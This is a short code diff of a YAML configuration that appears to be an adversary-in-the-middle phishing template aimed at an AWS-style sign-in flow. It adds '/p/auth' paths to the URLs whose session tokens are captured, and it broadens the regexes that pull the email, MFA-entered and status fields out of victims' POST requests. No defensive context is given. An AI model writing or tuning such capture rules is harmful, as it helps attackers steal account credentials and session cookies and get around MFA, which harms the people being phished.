@@ -113,6 +113,8 @@ auth_tokens:
 auth_urls:
   - '/authenticate'
   - '/authenticate/.*'
+  - '/p/auth'
+  - '/p/auth/.*'
 
 credentials:
   username:
@@ -131,16 +133,16 @@ credentials:
     search: '(.*)'
     type: 'post'
   - key: 'action'
-    search: '([^"]*)'
+    search: '(.*)'
     type: 'post'
   - key: 'email'
-    search: '([^"]*)'
+    search: '(.*)'
     type: 'post'
   - key: 'statusCode'
-    search: '([^"]*)'
+    search: '(.*)'
     type: 'post'
   - key: 'aws-mfa-entered'
-    search: '([^"]*)'
+    search: '(.*)'
     type: 'post'
   - key: ''
     search: '([^"]*)'
